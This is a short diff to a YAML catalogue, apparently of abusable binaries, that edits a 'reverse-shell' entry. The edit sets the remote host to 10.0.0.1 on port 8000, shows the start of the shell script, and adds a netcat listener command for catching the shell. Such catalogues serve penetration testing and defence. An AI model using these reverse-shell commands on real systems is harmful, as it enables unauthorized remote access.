@@ -9,8 +9,9 @@ functions:
         !/bin/sh
       description: MacOS only.
   reverse-shell:
-    - code: |
-        RHOST=127.0.0.1
+    - description: Run `nc -l -p 8000` to receive the shell on the other end.
+      code: |
+        RHOST=10.0.0.1
         RPORT=8000
         TF=$(mktemp)
         rm $TF
